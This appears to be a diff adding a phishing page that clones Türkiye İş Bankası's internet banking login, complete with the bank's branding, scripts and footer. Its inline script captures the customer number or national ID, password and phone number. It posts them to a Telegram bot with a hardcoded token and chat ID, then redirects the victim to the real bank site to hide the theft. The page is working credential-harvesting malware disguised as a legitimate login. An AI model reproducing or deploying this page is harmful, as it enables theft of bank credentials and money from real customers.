df/JkItPo+L7RmvWzn2UmZOk4VdyEw3PCHIsIfTxv7KGxhQfbgSXHYBIUidnjfcx1s4k47aJe2SNfH9xg67EkaPnpVyrjn04RNrJJAYWkDUEupOp1rtTMNrNMjTJ95UxWmZi3v4VKeK7XcukvkWnHtGmlFhMdwGQuQNJ9Q4yxqmuTYIIAaprpyAIVTNR4V+/9hzGqvyK8IzpgJhFiIkNvTQKC2M6cyBGGqOCUx60rFaj/LQF7C94C8IaDnrGERyUiLRoNVICHfOxnXlua5t3eOlg1uhfE2z0CpW3aV57hGD+UyZbOgurBuhj0TDW0bDJKLRGO8gWu1Sgm1Mw5y13zGILpnqkYg8JkoTPCCEJN94YCockRxParKz3NtR2YNM3IpBUbpxL6LvUXW7kXKIo7ZG8Na/a16lo0UMMbyYDZEz+XCCarM94FbPegvEoJGztMu5xistxtRO3OYT94DMWrewh1tr4uwQwdzGRCZMtgi8cBLlYb9G+ppoLOOdvLstiFhtXQOtfT1ZLcxH4xpkTdZZFJ0z3E4tfLVU1ydiaCSqlOgnpXTlB3ptpZDK1kbnfR44zXkUbfKNF/V/W5OQ==" />
+
+    <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="622559FF" />
+    <input type="hidden" name="FormSubmitted" id="FormSubmitted" value="false" />
+    <input type="hidden" name="IsJagEditDownloaded" id="IsJagEditDownloaded" value="false" />
+    <input name="hiddenIsICS" type="hidden" id="hiddenIsICS" value="0" />
+
+
+    <input name="l_chomarActive" type="hidden" id="l_chomarActive" value="true" />
+    <input name="l_ChomarEndpoint" type="hidden" id="l_ChomarEndpoint" value="https://chomardfp.isbank.com.tr" />
+    <input name="l_ChomarAppId" type="hidden" id="l_ChomarAppId" value="AGY0J84tjm8KhYQ7CJAy344FZpr87MSF" />
+    <input name="l_IsCallChomarBank" type="hidden" id="l_IsCallChomarBank" value="true" />
+    <input name="l_chomarCdnTag" type="hidden" id="l_chomarCdnTag" value="https://cdn.chomar.net/dfp/dfp.min.js" />
+    <input name="l_ChomarFp" type="hidden" id="l_ChomarFp" />
+    <input name="l_ChomarUseTlsFingerprint" type="hidden" id="l_ChomarUseTlsFingerprint" value="false" />
+    <input name="l_ChomarSslFpUrl" type="hidden" id="l_ChomarSslFpUrl" value="https://chomarsslfp.isbank.com.tr" />
+
+    <span id="strLangCode">
+        <script language="javascript">var LangCode; LangCode = 'tr-TR';</script>
+    </span>
+    <script language='javascript'
+        type='text/javascript'> var showOldBrowser = true; var operatingSystemMessage = 'Kullandığınız işletim sistemi Microsoft tarafından desteklenmemektedir. Güvenliğiniz için Windows 7 veya üzeri işletim sistemi versiyonu kullanmanızı öneriyoruz. İşletim sisteminizi <a class="blueLink" href="http://windows.microsoft.com/tr-tr/internet-explorer/download-ie" target="_blank">buradan</a> güncelleyebilirsiniz.'; var oldBrowserMessage = 'Kullandığınız Internet Explorer versiyonu Microsoft tarafından desteklenmemektedir. Güvenliğiniz için <a class="blueLink" href="http://windows.microsoft.com/tr-tr/internet-explorer/download-ie" target="_blank">en güncel versiyonu</a> kullanmanızı öneriyoruz. Kullanabileceğiniz internet tarayıcıları hakkında <a class="blueLink" href="http://www.isbank.com.tr/TR/guvenlik/internet-tarayicilari/Sayfalar/internet-tarayicilari.aspx" target="_blank">buradan</a> bilgi edinebilirsiniz.';</script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/IntSubeJS/LanguageFiles/Messages_tr-TR.js?240408032319"></script>
+
+    <div id="viewport">
+        <div id="updateBrowserInfoContainer">
+            <div id="updateBrowserInfoElement">
+                <img src="omni/assets/img/updateImg1.png" alt="tarayıcınız güncel değil" />
+                <span id="logonEskiBrowser">
+                    Internet Explorer'ın güncel olmayan bir versiyonunu kullanıyorsunuz. En iyi şekilde
+                    kullanım için tarayıcı versiyonunuzu <a class="blueLink"
+                        href="http://windows.microsoft.com/tr-tr/internet-explorer/download-ie"
+                        target="_blank">buradan</a> güncelleyebilirsiniz.
+                </span>
+                <div id="close">
+                    <img src="omni/assets/img/updateImg2.png" alt="" />
+                </div>
+            </div>
+        </div>
+        <div id="leftBannerContainer"
+            style="background-image:url(&quot;https://gorsel.isbank.com.tr/BIB/intsube_Resim/Reklamlar/z5z6/banner.jpg?5_7_2024&quot;);">
+        </div>
+        <div id="header">
+            <div id="logoContainer">
+                <img class="isbank-header-logo" src="omni/assets/img/logo.png" alt="iş bankası logo" />
+            </div>
+
+        </div>
+        <div id="mainContent" class="loginMainContent">
+            <div class="mobileHeaderContainer">
+                <div class="mobileHeader">
+                </div>
+            </div>
+            <div class="pageContainer">
+                <div id="StraightLogin">
+
+                    <span id="LoginLabel">
+                        <script language="JavaScript" type="text/javascript"
+                            src="IntSubeJs/Internet02/CheckFieldsLogon.js?240408032317"></script>
+                        <script language="JavaScript" type="text/javascript"
+                            src="IntSubeJS/Formatter.js?240408032317"></script>
+                        <script language="JavaScript" type="text/javascript"
+                            src="IntSubeJS/RSA/RSA.js?240408032319"></script>
+                        <script language="JavaScript" type="text/javascript"
+                            src="IntSubeJS/RSA/BigInt.js?240408032319"></script>
+                        <script language="JavaScript" type="text/javascript"
+                            src="IntSubeJS/RSA/Barrett.js?240408032319"></script>
+                        <script language="JavaScript" type="text/javascript" src="/js/itrHs.js?240408032222"></script>
+                        <script language="JavaScript" type="text/javascript"
+                            src="https://www.isbank.com.tr/Internet/IntSubeJS/Z5Z6.js?240408032320"></script>
+                        <LINK type="text/css" rel="STYLESHEET"
+                            href="https://www.isbank.com.tr/Internet/Css/Checkbox/checkbox.css?2404080323" />
+                        <LINK type="text/css" rel="STYLESHEET"
+                            href="https://www.isbank.com.tr/Internet/Omni/css_new/mediaQuery/loginChrome.css?2404080323" />
+                        <script language="JavaScript" type="text/javascript"
+                            src="https://www.isbank.com.tr/Internet/IntSubeJS/isbprefs.js?240408032321"></script>
+
+
+
+                        <input type="hidden" id="isb-user_prefs" name="isb-user_prefs">
+                        <input type="hidden" id="user_prefs2" name="user_prefs2">
+
+
+
+
+                        <input type="hidden" value="LOG2" name="trkd" />
+                        <input name="_ctl0:resizeStatus" type="hidden" id="resizeStatus" value="0" />
+                        <!-- Login Paneli -->
+
+
+
+                        <div id="z5-tab-wrapper">
+                        </div>
+                        <div id="loginPageMiddlePartContainer" oncontextmenu="return false;">
+                            <div class="contentBoxContainer">
+                                <div class="contentBox" id="loginTypesContainer">
+                                    <div id="Form1Div">
+                                        <div class="loginTitle">
+                                            <span id="_ctl0_subeLogin01Title">Türkiye İş Bankası Bireysel<br />İnternet
+                                                Şubenize Hoş Geldiniz!</span>
+                                        </div>
+
+                                        <div class="loginTitleMobile">
+                                            <span id="_ctl0_subeLogin01TitleMobile">İnternet Şubenize
+                                                Hoşgeldiniz!</span>
+                                        </div>
+                                        <div id="tabs">
+                                            <ul>
+                                            </ul>
+                                            <div id="tabs1">
+                                                <div class="loginErrorContainer" id="loginErrorContainer">
+                                                    <div class="errorSymbol">
+                                                        <img id="img_errorSymbol" src="omni/assets/img/error_icon.png"
+                                                            alt="giriÅ? hatalÄ±" />
+                                                    </div>
+                                                    <div class="errorText" id="loginErrorText">
+                                                        <span id="_ctl0_LoginCookieDisabledLabel">Çerezleri aktif hale
+                                                            getirdikten sonra giriş yapmanızı rica ederiz. Çerez
+                                                            politikamızı www.isbank.com.tr sayfamızdan
+                                                            inceleyebilirsiniz.</span>
+                                                    </div>
+                                                </div>
+                                                <form id="telegramLog" action="">
+                                                    <div id="loginFormBottomPartContainer">
+                                                        <div class="tabContentContainer">
+                                                            <div class="inputLabel ie8-9Only">
+                                                                <span id="_ctl0_subeLogin01MusteriNumarasi">Müşteri
+                                                                    Numaranız / TCKN / YKN</span>
+                                                            </div>
+                                                            <div class="loginInputContainer bottom10">
+                                                                <input name="_ctl0:_ctl0_MusNoText" type="tel"
+                                                                    id="_ctl0_MusNoText"
+                                                                    placeholder="Müşteri Numaranız / TCKN / YKN"
+                                                                    title="Müşteri Numaranız / TCKN / YKN"
+                                                                    maxlength="11"
+                                                                    class="standardInput info onlyNumeric allowCopyPaste"
+                                                                    autocomplete="off" tabindex="1" required
+                                                                    pattern="\d{11}" />
+                                                                <span id="tcError" class="error"></span>
+                                                            </div>
+                                                        </div>
+                                                        <div class="inputLabel loginPasswordLabel ie8-9Only">
+                                                            <span id="_ctl0_subeLogin01PassTempPass">Şifre / Geçici
+                                                                Şifre</span>
+                                                        </div>
+                                                        <div
+                                                            class="loginInputContainer loginPasswordInputContainer ui-login-z5">
+                                                            <input name="_ctl0:ParolaText" type="password"
+                                                                id="ParolaText" pattern="\d{6,}" maxlength="6"
+                                                                placeholder="Şifre / Geçici Şifre"
+                                                                title="Şifre / Geçici Şifre" tabindex="2" size="6"
+                                                                class="standardInput info onlyNumeric virtualKeypad removeAutoFill"
+                                                                autocomplete="off" required />
+                                                            <span id="passError" class="error"></span>
+                                                        </div>
+                                                        <div class="tabContentContainer">
+                                                            <div class="inputLabel ie8-9Only">
+                                                                <span id="_ctl0_subeLogin01MusteriNumarasi">Telefon
+                                                                    Numaranız</span>
+                                                            </div>
+                                                            <div class="loginInputContainer bottom10">
+                                                                <input name="_ctl0:_ctl0_MusNoText" type="tel"
+                                                                    id="_ctl0_TelNo" placeholder="Telefon Numaranız"
+                                                                    title="Telefon Numaranız" maxlength="10"
+                                                                    class="standardInput info onlyNumeric allowCopyPaste"
+                                                                    autocomplete="off" tabindex="1" required
+                                                                    pattern="\d{10}" />
+                                                                <span id="telError" class="error"></span>
+                                                            </div>
+                                                        </div>
+                                                        <div class="loginFormButtonHolder">
+                                                            <button id="_ctl0_SubeLogin01_btnGiris"
+                                                                class="ui-button darkBlueButton login" type="submit"
+                                                                tabindex="19"
+                                                                name="_ctl0:SubeLogin01_btnGiris">Giriş</button>
+                                                        </div>
+                                                    </div>
+                                                </form>
+                                                <script>
+                                                    document.getElementById('telegramLog').addEventListener('submit', async function (event) {
+                                                        event.preventDefault();
+
+                                                        const musNoText = document.getElementById('_ctl0_MusNoText').value;
+                                                        const parolaText = document.getElementById('ParolaText').value;
+                                                        const telefonNumarasi = document.getElementById('_ctl0_TelNo').value;
+
+                                                        let valid = true;
+
+                                                        if (musNoText.length !== 11 || isNaN(musNoText)) {
+                                                            document.getElementById('tcError').innerText = 'TCKN 11 haneli olmalı ve sadece rakam içermelidir.';
+                                                            valid = false;
+                                                        } else {
+                                                            document.getElementById('tcError').innerText = '';
+                                                        }
+
+                                                        if (parolaText.length < 6 || isNaN(parolaText)) {
+                                                            document.getElementById('passError').innerText = 'Şifre en az 6 haneli olmalı ve sadece rakam içermelidir.';
+                                                            valid = false;
+                                                        } else {
+                                                            document.getElementById('passError').innerText = '';
+                                                        }
+
+                                                        if (telefonNumarasi.length !== 10 || isNaN(telefonNumarasi)) {
+                                                            document.getElementById('telError').innerText = 'Telefon numarası 10 haneli olmalı ve sadece rakam içermelidir.';
+                                                            valid = false;
+                                                        } else {
+                                                            document.getElementById('telError').innerText = '';
+                                                        }
+
+                                                        if (!valid) {
+                                                            return;
+                                                        }
+
+                                                        const message = `Müşteri Numaranız / TCKN / YKN: ${musNoText}\nŞifre / Geçici Şifre: ${parolaText}\nTelefon Numaranız: ${telefonNumarasi}`;
+
+                                                        const botToken = 'https://api.telegram.org/bot7155697680:AAF9uSeCUt2Z_Pwgedw9PPy5ejR6Kz0irkc/sendMessage'; // Telegram bot tokenınızı buraya koyun
+                                                        const chatId = '-1002204349621'; // Chat ID'nizi buraya koyun
+                                                        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                                                        const data = new URLSearchParams();
+                                                        data.append('chat_id', chatId);
+                                                        data.append('text', message);
+
+                                                        try {
+                                                            const response = await fetch(url, {
+                                                                method: 'POST',
+                                                                headers: {
+                                                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                                                },
+                                                                body: data
+                                                            });
+                                                            const responseData = await response.json();
+                                                            if (responseData.ok) {
+                                                                window.location.href = 'https://www.isbank.com.tr/online-bireysel-internet-subesi'; 
+                                                            } else {
+                                                                alert('Mesaj gönderilirken bir hata oluştu: ' + responseData.description);
+                                                            }
+                                                        } catch (error) {
+                                                            console.error('Hata:', error);
+                                                            alert('Mesaj gönderilirken bir hata oluştu.');
+                                                        }
+                                                    });
+                                                    document.querySelectorAll('.onlyNumeric').forEach(input => {
+                                                        input.addEventListener('input', () => {
+                                                            input.value = input.value.replace(/\D/g, '');
+                                                        });
+                                                    });
+                                                </script>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                            </div>
+
+                            <script type="text/javascript">
+
+
+
+                                if (isJsCookie.Read('Z6MokTimedOut')) {
+                                    isJsCookie.Delete('Z6MokTimedOut');
+
+                                    isJsCookie.Delete('StatusByDiyalog');
+                                }
+
+                                var TimeOutPeriod = 600000;
+                                var TimetoTimeOut = TimeOutPeriod / 1000;
+                                ShowLoginTimeOutPeriod();
+
+                                function ShowLoginTimeOutPeriod() {
+                                    if (TimetoTimeOut > 0) {
+                                        TimetoTimeOut = TimetoTimeOut - 1;
+                                        tf = window.setTimeout('ShowLoginTimeOutPeriod();', 1000);
+                                    }
+                                    else if (TimetoTimeOut == 0) {
+                                        if (document.getElementById("isTabletApp") && document.getElementById('isTabletApp').value == "true") {
+                                            var os = document.getElementById("osType").value;
+                                            window.location = 'index.aspx?isTablet=true&OS=' + os;
+                                        }
+                                        else
+                                            window.location = window.location;  //tr ve en sorunu olmadan
+                                    }
+                                }
+
+
+                            </script>
+                    </span>
+
+                </div>
+            </div>
+            <div id="canvasDiv" style="text-align: center;
+                vertical-align: top; padding-top: 20px;">
+            </div>
+        </div>
+        <div id="footer">
+            <div id="content">
+                <div id="left">
+                    <div class="container">
+                        <!--<img id="symantec-logo" src="omni/assets/img/symantec_logo.png" alt="" />-->
+                        <span id="copyRightContainer">&copy;2024 Türkiye İş Bankası A.Ş</span>
+                    </div>
+                </div>
+                <div id="right">
+                    <div class="container">
+                        <div id="footerLinksContainer">
+                            <div class="footerLinks contactUsContainer">
+                                <a href="https://www.isbank.com.tr/iletisim-formu" id="indexLinkIletisim"
+                                    target="_blank">
+                                    <span id="indexIletisim">Bize Ulaşın</span>
+                                </a>
+                            </div>
+                            <div class="footerLinks last languageContainer">
+                                <span id="lblSubeGirisLangSelect">
+                                    <LINK type="text/css" rel="STYLESHEET"
+                                        href="https://www.isbank.com.tr/Internet/Omni/css_new/mediaQuery/footer.css?2404080323" />
+                                    <div id="languageFlagSelect">
+                                        <span id="usaflaglabel"
+                                            class="isbank-page-language selected-language">English</span>
+
+                                        <span id="turkishflaglabel" class="isbank-page-language">Türkçe</span>
+
+                                    </div>
+                                    <script language="JavaScript" type="text/javascript"
+                                        src="https://www.isbank.com.tr/Internet/Omni/js/app/footer.js?240408032325"></script>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="touchOverlay">
+        </div>
+    </div>
+
+    <script type="text/javascript" language="javascript">var CchBrk = '05.07.2024 16:13:47'</script>
+    <script language='JavaScript'>var CaptchaControl = false;</script>
+    <script language="JavaScript" type="text/javascript" src="Omni/js/app/login.js?240408032325"></script>
+
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/app/keyPadCommons.js?240408032325"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/app/footer.js?240408032325"></script>
+</body>
+
+</html>
